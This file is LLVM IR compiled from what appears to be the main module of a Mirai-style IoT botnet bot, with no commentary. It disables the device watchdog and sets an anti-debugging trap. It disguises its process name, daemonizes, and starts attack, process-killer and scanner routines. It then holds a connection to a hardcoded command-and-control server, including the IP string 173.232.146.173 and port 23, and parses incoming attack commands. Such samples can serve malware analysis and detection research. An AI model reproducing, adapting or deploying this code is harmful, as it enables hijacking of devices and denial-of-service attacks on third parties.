; ModuleID = 'main.c'
source_filename = "main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.__sigset_t = type { [16 x i64] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@fd_ctrl = dso_local global i32 -1, align 4
@fd_serv = dso_local global i32 -1, align 4
@watchdog_pid = dso_local global i32 0, align 4
@pending_connection = dso_local global i8 0, align 1
@resolve_func = dso_local global void ()* bitcast (i32 ()* @util_local_addr to void ()*), align 8
@LOCAL_ADDR = dso_local global i32 0, align 4
@srv_addr = dso_local global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"173.232.146.173\00", align 1

declare i32 @util_local_addr() #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @watchdog_maintain() #1 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = call i32 @fork() #5
  store i32 %4, i32* @watchdog_pid, align 4
  %5 = load i32, i32* @watchdog_pid, align 4
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %10, label %7

7:                                                ; preds = %0
  %8 = load i32, i32* @watchdog_pid, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %7, %0
  ret void

11:                                               ; preds = %7
  store i32 1, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  call void @table_unlock_val(i8 zeroext 23)
  call void @table_unlock_val(i8 zeroext 24)
  %12 = call i8* @table_retrieve_val(i32 23, i32* null)
  %13 = call i32 (i8*, i32, ...) @open(i8* %12, i32 2)
  store i32 %13, i32* %2, align 4
  %14 = icmp ne i32 %13, -1
  br i1 %14, label %19, label %15

15:                                               ; preds = %11
  %16 = call i8* @table_retrieve_val(i32 24, i32* null)
  %17 = call i32 (i8*, i32, ...) @open(i8* %16, i32 2)
  store i32 %17, i32* %2, align 4
  %18 = icmp ne i32 %17, -1
  br i1 %18, label %19, label %22

19:                                               ; preds = %15, %11
  store i32 1, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 (i32, i64, ...) @ioctl(i32 %20, i64 2147768068, i32* %1) #5
  br label %22

22:                                               ; preds = %19, %15
  %23 = load i32, i32* %3, align 4
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %30

25:                                               ; preds = %22
  br label %26

26:                                               ; preds = %25, %26
  %27 = load i32, i32* %2, align 4
  %28 = call i32 (i32, i64, ...) @ioctl(i32 %27, i64 2147768069, i32 0) #5
  %29 = call i32 @sleep(i32 10)
  br label %26

30:                                               ; preds = %22
  call void @table_lock_val(i8 zeroext 23)
  call void @table_lock_val(i8 zeroext 24)
  call void @exit(i32 0) #6
  unreachable
}

; Function Attrs: nounwind
declare i32 @fork() #2

declare void @table_unlock_val(i8 zeroext) #0

declare i32 @open(i8*, i32, ...) #0

declare i8* @table_retrieve_val(i32, i32*) #0

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #2

declare i32 @sleep(i32) #0

declare void @table_lock_val(i8 zeroext) #0

; Function Attrs: noreturn nounwind
declare void @exit(i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #1 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [32 x i8], align 16
  %8 = alloca [32 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.__sigset_t, align 8
  %14 = alloca %struct.fd_set, align 8
  %15 = alloca %struct.fd_set, align 8
  %16 = alloca %struct.fd_set, align 8
  %17 = alloca %struct.timeval, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set*, align 8
  %22 = alloca i32, align 4
  %23 = alloca %struct.fd_set*, align 8
  %24 = alloca i16, align 2
  %25 = alloca %struct.sockaddr_in, align 4
  %26 = alloca i32, align 4
  %27 = alloca %union.__SOCKADDR_ARG, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8, align 1
  %31 = alloca i32, align 4
  %32 = alloca i16, align 2
  %33 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %34 = call i32 @sigemptyset(%struct.__sigset_t* %13) #5
  %35 = call i32 @sigaddset(%struct.__sigset_t* %13, i32 2) #5
  %36 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %13, %struct.__sigset_t* null) #5
  %37 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %38 = call void (i32)* @signal(i32 5, void (i32)* @anti_gdb_entry) #5
  %39 = call i32 @util_local_addr()
  store i32 %39, i32* @LOCAL_ADDR, align 4
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %40 = call i32 @htonl(i32 -1334109607) #7
  store i32 %40, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %41 = call zeroext i16 @htons(i16 zeroext 23) #7
  store i16 %41, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  call void @table_init()
  call void @anti_gdb_entry(i32 0)
  call void @rand_init()
  %42 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  call void @util_zero(i8* %42, i32 32)
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, 2
  br i1 %44, label %45, label %64

45:                                               ; preds = %2
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @util_strlen(i8* %48)
  %50 = icmp slt i32 %49, 32
  br i1 %50, label %51, label %64

51:                                               ; preds = %45
  %52 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @util_strcpy(i8* %52, i8* %55)
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @util_strlen(i8* %62)
  call void @util_zero(i8* %59, i32 %63)
  br label %64

64:                                               ; preds = %51, %45, %2
  %65 = call i32 @rand_next()
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @util_strlen(i8* %68)
  %70 = sub nsw i32 20, %69
  %71 = urem i32 %65, %70
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 0
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @util_strlen(i8* %74)
  %76 = add i32 %71, %75
  store i32 %76, i32* %9, align 4
  %77 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %78 = load i32, i32* %9, align 4
  call void @rand_alpha_str(i8* %77, i32 %78)
  %79 = load i32, i32* %9, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %80
  store i8 0, i8* %81, align 1
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %86 = call i32 @util_strcpy(i8* %84, i8* %85)
  %87 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  call void @util_zero(i8* %87, i32 32)
  %88 = call i32 @rand_next()
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 0
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = sub nsw i32 20, %92
  %94 = urem i32 %88, %93
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @util_strlen(i8* %97)
  %99 = add i32 %94, %98
  store i32 %99, i32* %9, align 4
  %100 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %101 = load i32, i32* %9, align 4
  call void @rand_alpha_str(i8* %100, i32 %101)
  %102 = load i32, i32* %9, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %103
  store i8 0, i8* %104, align 1
  %105 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %106 = call i32 (i32, ...) @prctl(i32 15, i8* %105) #5
  call void @table_unlock_val(i8 zeroext 3)
  %107 = call i8* @table_retrieve_val(i32 3, i32* %10)
  store i8* %107, i8** %6, align 8
  %108 = load i8*, i8** %6, align 8
  %109 = load i32, i32* %10, align 4
  %110 = sext i32 %109 to i64
  %111 = call i64 @write(i32 1, i8* %108, i64 %110)
  %112 = call i64 @write(i32 1, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i64 1)
  call void @table_lock_val(i8 zeroext 3)
  %113 = call signext i8 @attack_init()
  call void @killer_init()
  call void @watchdog_maintain()
  %114 = call i32 @fork() #5
  %115 = icmp sgt i32 %114, 0
  br i1 %115, label %116, label %117

116:                                              ; preds = %64
  ret i32 0

117:                                              ; preds = %64
  %118 = call i32 @setsid() #5
  store i32 %118, i32* %11, align 4
  %119 = call i32 @close(i32 0)
  %120 = call i32 @close(i32 1)
  %121 = call i32 @close(i32 2)
  %122 = call signext i8 @attack_init()
  call void @killer_init()
  call void @watchdog_maintain()
  call void (...) @scanner_init()
  br label %123

123:                                              ; preds = %117, %217, %351, %357, %362, %372, %397, %403, %424
  br label %124

124:                                              ; preds = %123
  store %struct.fd_set* %14, %struct.fd_set** %21, align 8
  store i32 0, i32* %20, align 4
  br label %125

125:                                              ; preds = %135, %124
  %126 = load i32, i32* %20, align 4
  %127 = zext i32 %126 to i64
  %128 = icmp ult i64 %127, 16
  br i1 %128, label %129, label %138

129:                                              ; preds = %125
  %130 = load %struct.fd_set*, %struct.fd_set** %21, align 8
  %131 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %130, i32 0, i32 0
  %132 = load i32, i32* %20, align 4
  %133 = zext i32 %132 to i64
  %134 = getelementptr inbounds [16 x i64], [16 x i64]* %131, i64 0, i64 %133
  store i64 0, i64* %134, align 8
  br label %135

135:                                              ; preds = %129
  %136 = load i32, i32* %20, align 4
  %137 = add i32 %136, 1
  store i32 %137, i32* %20, align 4
  br label %125, !llvm.loop !6

138:                                              ; preds = %125
  br label %139

139:                                              ; preds = %138
  br label %140

140:                                              ; preds = %139
  store %struct.fd_set* %15, %struct.fd_set** %23, align 8
  store i32 0, i32* %22, align 4
  br label %141

141:                                              ; preds = %151, %140
  %142 = load i32, i32* %22, align 4
  %143 = zext i32 %142 to i64
  %144 = icmp ult i64 %143, 16
  br i1 %144, label %145, label %154

145:                                              ; preds = %141
  %146 = load %struct.fd_set*, %struct.fd_set** %23, align 8
  %147 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %146, i32 0, i32 0
  %148 = load i32, i32* %22, align 4
  %149 = zext i32 %148 to i64
  %150 = getelementptr inbounds [16 x i64], [16 x i64]* %147, i64 0, i64 %149
  store i64 0, i64* %150, align 8
  br label %151

151:                                              ; preds = %145
  %152 = load i32, i32* %22, align 4
  %153 = add i32 %152, 1
  store i32 %153, i32* %22, align 4
  br label %141, !llvm.loop !8

154:                                              ; preds = %141
  br label %155

155:                                              ; preds = %154
  %156 = load i32, i32* @fd_ctrl, align 4
  %157 = icmp ne i32 %156, -1
  br i1 %157, label %158, label %170

158:                                              ; preds = %155
  %159 = load i32, i32* @fd_ctrl, align 4
  %160 = srem i32 %159, 64
  %161 = zext i32 %160 to i64
  %162 = shl i64 1, %161
  %163 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %164 = load i32, i32* @fd_ctrl, align 4
  %165 = sdiv i32 %164, 64
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds [16 x i64], [16 x i64]* %163, i64 0, i64 %166
  %168 = load i64, i64* %167, align 8
  %169 = or i64 %168, %162
  store i64 %169, i64* %167, align 8
  br label %170

170:                                              ; preds = %158, %155
  %171 = load i32, i32* @fd_serv, align 4
  %172 = icmp eq i32 %171, -1
  br i1 %172, label %173, label %174

173:                                              ; preds = %170
  call void @establish_connection()
  br label %174

174:                                              ; preds = %173, %170
  %175 = load i8, i8* @pending_connection, align 1
  %176 = icmp ne i8 %175, 0
  br i1 %176, label %177, label %189

177:                                              ; preds = %174
  %178 = load i32, i32* @fd_serv, align 4
  %179 = srem i32 %178, 64
  %180 = zext i32 %179 to i64
  %181 = shl i64 1, %180
  %182 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %15, i32 0, i32 0
  %183 = load i32, i32* @fd_serv, align 4
  %184 = sdiv i32 %183, 64
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds [16 x i64], [16 x i64]* %182, i64 0, i64 %185
  %187 = load i64, i64* %186, align 8
  %188 = or i64 %187, %181
  store i64 %188, i64* %186, align 8
  br label %201

189:                                              ; preds = %174
  %190 = load i32, i32* @fd_serv, align 4
  %191 = srem i32 %190, 64
  %192 = zext i32 %191 to i64
  %193 = shl i64 1, %192
  %194 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %195 = load i32, i32* @fd_serv, align 4
  %196 = sdiv i32 %195, 64
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [16 x i64], [16 x i64]* %194, i64 0, i64 %197
  %199 = load i64, i64* %198, align 8
  %200 = or i64 %199, %193
  store i64 %200, i64* %198, align 8
  br label %201

201:                                              ; preds = %189, %177
  %202 = load i32, i32* @fd_ctrl, align 4
  %203 = load i32, i32* @fd_serv, align 4
  %204 = icmp sgt i32 %202, %203
  br i1 %204, label %205, label %207

205:                                              ; preds = %201
  %206 = load i32, i32* @fd_ctrl, align 4
  store i32 %206, i32* %18, align 4
  br label %209

207:                                              ; preds = %201
  %208 = load i32, i32* @fd_serv, align 4
  store i32 %208, i32* %18, align 4
  br label %209

209:                                              ; preds = %207, %205
  %210 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 1
  store i64 0, i64* %210, align 8
  %211 = getelementptr inbounds %struct.timeval, %struct.timeval* %17, i32 0, i32 0
  store i64 10, i64* %211, align 8
  %212 = load i32, i32* %18, align 4
  %213 = add nsw i32 %212, 1
  %214 = call i32 @select(i32 %213, %struct.fd_set* %14, %struct.fd_set* %15, %struct.fd_set* null, %struct.timeval* %17)
  store i32 %214, i32* %19, align 4
  %215 = load i32, i32* %19, align 4
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %217, label %218

217:                                              ; preds = %209
  br label %123

218:                                              ; preds = %209
  %219 = load i32, i32* %19, align 4
  %220 = icmp eq i32 %219, 0
  br i1 %220, label %221, label %231

221:                                              ; preds = %218
  store i16 0, i16* %24, align 2
  %222 = load i32, i32* %12, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %12, align 4
  %224 = srem i32 %222, 6
  %225 = icmp eq i32 %224, 0
  br i1 %225, label %226, label %230

226:                                              ; preds = %221
  %227 = load i32, i32* @fd_serv, align 4
  %228 = bitcast i16* %24 to i8*
  %229 = call i64 @send(i32 %227, i8* %228, i64 2, i32 16384)
  br label %230

230:                                              ; preds = %226, %221
  br label %231

231:                                              ; preds = %230, %218
  br label %232

232:                                              ; preds = %231
  %233 = load i32, i32* @fd_ctrl, align 4
  %234 = icmp ne i32 %233, -1
  br i1 %234, label %235, label %264

235:                                              ; preds = %232
  %236 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %237 = load i32, i32* @fd_ctrl, align 4
  %238 = sdiv i32 %237, 64
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [16 x i64], [16 x i64]* %236, i64 0, i64 %239
  %241 = load i64, i64* %240, align 8
  %242 = load i32, i32* @fd_ctrl, align 4
  %243 = srem i32 %242, 64
  %244 = zext i32 %243 to i64
  %245 = shl i64 1, %244
  %246 = and i64 %241, %245
  %247 = icmp ne i64 %246, 0
  br i1 %247, label %248, label %264

248:                                              ; preds = %235
  store i32 16, i32* %26, align 4
  %249 = load i32, i32* @fd_ctrl, align 4
  %250 = bitcast %union.__SOCKADDR_ARG* %27 to %struct.sockaddr**
  %251 = bitcast %struct.sockaddr_in* %25 to %struct.sockaddr*
  store %struct.sockaddr* %251, %struct.sockaddr** %250, align 8
  %252 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %27, i32 0, i32 0
  %253 = load %struct.sockaddr*, %struct.sockaddr** %252, align 8
  %254 = call i32 @accept(i32 %249, %struct.sockaddr* %253, i32* %26)
  call void @killer_kill()
  %255 = load i32, i32* %11, align 4
  %256 = mul nsw i32 %255, -1
  %257 = call i32 @kill(i32 %256, i32 9) #5
  %258 = load i32, i32* @watchdog_pid, align 4
  %259 = icmp ne i32 %258, 0
  br i1 %259, label %260, label %263

260:                                              ; preds = %248
  %261 = load i32, i32* @watchdog_pid, align 4
  %262 = call i32 @kill(i32 %261, i32 9) #5
  br label %263

263:                                              ; preds = %260, %248
  call void @exit(i32 0) #6
  unreachable

264:                                              ; preds = %235, %232
  %265 = load i8, i8* @pending_connection, align 1
  %266 = icmp ne i8 %265, 0
  br i1 %266, label %267, label %315

267:                                              ; preds = %264
  store i8 0, i8* @pending_connection, align 1
  %268 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %15, i32 0, i32 0
  %269 = load i32, i32* @fd_serv, align 4
  %270 = sdiv i32 %269, 64
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [16 x i64], [16 x i64]* %268, i64 0, i64 %271
  %273 = load i64, i64* %272, align 8
  %274 = load i32, i32* @fd_serv, align 4
  %275 = srem i32 %274, 64
  %276 = zext i32 %275 to i64
  %277 = shl i64 1, %276
  %278 = and i64 %273, %277
  %279 = icmp ne i64 %278, 0
  br i1 %279, label %281, label %280

280:                                              ; preds = %267
  call void @teardown_connection()
  br label %314

281:                                              ; preds = %267
  store i32 0, i32* %28, align 4
  store i32 4, i32* %29, align 4
  %282 = load i32, i32* @fd_serv, align 4
  %283 = bitcast i32* %28 to i8*
  %284 = call i32 @getsockopt(i32 %282, i32 1, i32 4, i8* %283, i32* %29) #5
  %285 = load i32, i32* %28, align 4
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %287, label %294

287:                                              ; preds = %281
  %288 = load i32, i32* @fd_serv, align 4
  %289 = call i32 @close(i32 %288)
  store i32 -1, i32* @fd_serv, align 4
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 10
  %292 = add i32 %291, 1
  %293 = call i32 @sleep(i32 %292)
  br label %313

294:                                              ; preds = %281
  %295 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %296 = call i32 @util_strlen(i8* %295)
  %297 = trunc i32 %296 to i8
  store i8 %297, i8* %30, align 1
  %298 = call i32 @util_local_addr()
  store i32 %298, i32* @LOCAL_ADDR, align 4
  %299 = load i32, i32* @fd_serv, align 4
  %300 = call i64 @send(i32 %299, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i64 4, i32 16384)
  %301 = load i32, i32* @fd_serv, align 4
  %302 = call i64 @send(i32 %301, i8* %30, i64 1, i32 16384)
  %303 = load i8, i8* %30, align 1
  %304 = zext i8 %303 to i32
  %305 = icmp sgt i32 %304, 0
  br i1 %305, label %306, label %312

306:                                              ; preds = %294
  %307 = load i32, i32* @fd_serv, align 4
  %308 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %309 = load i8, i8* %30, align 1
  %310 = zext i8 %309 to i64
  %311 = call i64 @send(i32 %307, i8* %308, i64 %310, i32 16384)
  br label %312

312:                                              ; preds = %306, %294
  br label %313

313:                                              ; preds = %312, %287
  br label %314

314:                                              ; preds = %313, %280
  br label %424

315:                                              ; preds = %264
  %316 = load i32, i32* @fd_serv, align 4
  %317 = icmp ne i32 %316, -1
  br i1 %317, label %318, label %423

318:                                              ; preds = %315
  %319 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %14, i32 0, i32 0
  %320 = load i32, i32* @fd_serv, align 4
  %321 = sdiv i32 %320, 64
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds [16 x i64], [16 x i64]* %319, i64 0, i64 %322
  %324 = load i64, i64* %323, align 8
  %325 = load i32, i32* @fd_serv, align 4
  %326 = srem i32 %325, 64
  %327 = zext i32 %326 to i64
  %328 = shl i64 1, %327
  %329 = and i64 %324, %328
  %330 = icmp ne i64 %329, 0
  br i1 %330, label %331, label %423

331:                                              ; preds = %318
  store i32 0, i32* %31, align 4
  store i16 0, i16* %32, align 2
  %332 = call i32* @__errno_location() #7
  store i32 0, i32* %332, align 4
  %333 = load i32, i32* @fd_serv, align 4
  %334 = bitcast i16* %32 to i8*
  %335 = call i64 @recv(i32 %333, i8* %334, i64 2, i32 16386)
  %336 = trunc i64 %335 to i32
  store i32 %336, i32* %31, align 4
  %337 = load i32, i32* %31, align 4
  %338 = icmp eq i32 %337, -1
  br i1 %338, label %339, label %354

339:                                              ; preds = %331
  %340 = call i32* @__errno_location() #7
  %341 = load i32, i32* %340, align 4
  %342 = icmp eq i32 %341, 11
  br i1 %342, label %351, label %343

343:                                              ; preds = %339
  %344 = call i32* @__errno_location() #7
  %345 = load i32, i32* %344, align 4
  %346 = icmp eq i32 %345, 11
  br i1 %346, label %351, label %347

347:                                              ; preds = %343
  %348 = call i32* @__errno_location() #7
  %349 = load i32, i32* %348, align 4
  %350 = icmp eq i32 %349, 4
  br i1 %350, label %351, label %352

351:                                              ; preds = %347, %343, %339
  br label %123

352:                                              ; preds = %347
  store i32 0, i32* %31, align 4
  br label %353

353:                                              ; preds = %352
  br label %354

354:                                              ; preds = %353, %331
  %355 = load i32, i32* %31, align 4
  %356 = icmp eq i32 %355, 0
  br i1 %356, label %357, label %358

357:                                              ; preds = %354
  call void @teardown_connection()
  br label %123

358:                                              ; preds = %354
  %359 = load i16, i16* %32, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 0
  br i1 %361, label %362, label %366

362:                                              ; preds = %358
  %363 = load i32, i32* @fd_serv, align 4
  %364 = bitcast i16* %32 to i8*
  %365 = call i64 @recv(i32 %363, i8* %364, i64 2, i32 16384)
  br label %123

366:                                              ; preds = %358
  %367 = load i16, i16* %32, align 2
  %368 = call zeroext i16 @ntohs(i16 zeroext %367) #7
  store i16 %368, i16* %32, align 2
  %369 = load i16, i16* %32, align 2
  %370 = zext i16 %369 to i64
  %371 = icmp ugt i64 %370, 1024
  br i1 %371, label %372, label %375

372:                                              ; preds = %366
  %373 = load i32, i32* @fd_serv, align 4
  %374 = call i32 @close(i32 %373)
  store i32 -1, i32* @fd_serv, align 4
  br label %123

375:                                              ; preds = %366
  %376 = call i32* @__errno_location() #7
  store i32 0, i32* %376, align 4
  %377 = load i32, i32* @fd_serv, align 4
  %378 = getelementptr inbounds [1024 x i8], [1024 x i8]* %33, i64 0, i64 0
  %379 = load i16, i16* %32, align 2
  %380 = zext i16 %379 to i64
  %381 = call i64 @recv(i32 %377, i8* %378, i64 %380, i32 16386)
  %382 = trunc i64 %381 to i32
  store i32 %382, i32* %31, align 4
  %383 = load i32, i32* %31, align 4
  %384 = icmp eq i32 %383, -1
  br i1 %384, label %385, label %400

385:                                              ; preds = %375
  %386 = call i32* @__errno_location() #7
  %387 = load i32, i32* %386, align 4
  %388 = icmp eq i32 %387, 11
  br i1 %388, label %397, label %389

389:                                              ; preds = %385
  %390 = call i32* @__errno_location() #7
  %391 = load i32, i32* %390, align 4
  %392 = icmp eq i32 %391, 11
  br i1 %392, label %397, label %393

393:                                              ; preds = %389
  %394 = call i32* @__errno_location() #7
  %395 = load i32, i32* %394, align 4
  %396 = icmp eq i32 %395, 4
  br i1 %396, label %397, label %398

397:                                              ; preds = %393, %389, %385
  br label %123

398:                                              ; preds = %393
  store i32 0, i32* %31, align 4
  br label %399

399:                                              ; preds = %398
  br label %400

400:                                              ; preds = %399, %375
  %401 = load i32, i32* %31, align 4
  %402 = icmp eq i32 %401, 0
  br i1 %402, label %403, label %404

403:                                              ; preds = %400
  call void @teardown_connection()
  br label %123

404:                                              ; preds = %400
  %405 = load i32, i32* @fd_serv, align 4
  %406 = bitcast i16* %32 to i8*
  %407 = call i64 @recv(i32 %405, i8* %406, i64 2, i32 16384)
  %408 = load i16, i16* %32, align 2
  %409 = call zeroext i16 @ntohs(i16 zeroext %408) #7
  store i16 %409, i16* %32, align 2
  %410 = load i32, i32* @fd_serv, align 4
  %411 = getelementptr inbounds [1024 x i8], [1024 x i8]* %33, i64 0, i64 0
  %412 = load i16, i16* %32, align 2
  %413 = zext i16 %412 to i64
  %414 = call i64 @recv(i32 %410, i8* %411, i64 %413, i32 16384)
  %415 = load i16, i16* %32, align 2
  %416 = zext i16 %415 to i32
  %417 = icmp sgt i32 %416, 0
  br i1 %417, label %418, label %422

418:                                              ; preds = %404
  %419 = getelementptr inbounds [1024 x i8], [1024 x i8]* %33, i64 0, i64 0
  %420 = load i16, i16* %32, align 2
  %421 = zext i16 %420 to i32
  call void @attack_parse(i8* %419, i32 %421)
  br label %422

422:                                              ; preds = %418, %404
  br label %423

423:                                              ; preds = %422, %318, %315
  br label %424

424:                                              ; preds = %423, %314
  br label %123
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #2

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #2

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @anti_gdb_entry(i32 %0) #1 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store void ()* @resolve_cnc_addr, void ()** @resolve_func, align 8
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

declare void @table_init() #0

declare void @rand_init() #0

declare void @util_zero(i8*, i32) #0

declare i32 @util_strlen(i8*) #0

declare i32 @util_strcpy(i8*, i8*) #0

declare i32 @rand_next() #0

declare void @rand_alpha_str(i8*, i32) #0

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #2

declare i64 @write(i32, i8*, i64) #0

declare signext i8 @attack_init() #0

declare void @killer_init() #0

; Function Attrs: nounwind
declare i32 @setsid() #2

declare i32 @close(i32) #0

declare void @scanner_init(...) #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @establish_connection() #1 {
  %1 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %2, i32* @fd_serv, align 4
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  br label %21

5:                                                ; preds = %0
  %6 = load i32, i32* @fd_serv, align 4
  %7 = load i32, i32* @fd_serv, align 4
  %8 = call i32 (i32, i32, ...) @fcntl(i32 %7, i32 3, i32 0)
  %9 = or i32 2048, %8
  %10 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 4, i32 %9)
  %11 = load void ()*, void ()** @resolve_func, align 8
  %12 = icmp ne void ()* %11, null
  br i1 %12, label %13, label %15

13:                                               ; preds = %5
  %14 = load void ()*, void ()** @resolve_func, align 8
  call void %14()
  br label %15

15:                                               ; preds = %13, %5
  store i8 1, i8* @pending_connection, align 1
  %16 = load i32, i32* @fd_serv, align 4
  %17 = bitcast %union.__CONST_SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %17, align 8
  %18 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %1, i32 0, i32 0
  %19 = load %struct.sockaddr*, %struct.sockaddr** %18, align 8
  %20 = call i32 @connect(i32 %16, %struct.sockaddr* %19, i32 16)
  br label %21

21:                                               ; preds = %15, %4
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #0

